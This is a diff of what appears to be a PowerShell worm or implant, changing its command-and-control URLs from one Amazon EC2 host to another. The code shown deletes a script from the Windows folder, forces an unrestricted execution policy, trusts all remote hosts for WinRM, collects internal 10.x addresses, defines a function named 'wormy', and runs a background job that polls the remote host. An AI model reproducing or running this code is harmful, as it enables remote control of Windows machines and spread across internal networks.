@@ -7,8 +7,8 @@ else{
 remove-item c:\Windows\EventLog.ps1
 [net.servicepointmanager]::SecurityProtocol = [net.securityprotocoltype]::Tls12
 set-executionpolicy Unrestricted -force
-$cNcURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
-$timeURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/eeee/timeZ.txt'
+$cNcURL='http://ec2-34-206-59-90.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
+$timeURL='http://ec2-34-206-59-90.compute-1.amazonaws.com/eeee/timeZ.txt'
 $hostIP= Get-NetIPAddress | where {($_.IPAddress -like "10.*")} | foreach{$_.IPAddress}
 Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
 $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
@@ -151,7 +151,7 @@ function wormy{
 
 
 start-job -ScriptBlock{
-    $timeURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/eeee/timeZ.txt'
+    $timeURL='http://ec2-34-206-59-90.compute-1.amazonaws.com/eeee/timeZ.txt'
     while(1 -eq 2){
     $toAppend=invoke-restmethod $timeURL
     Start-Service VMWareCapture
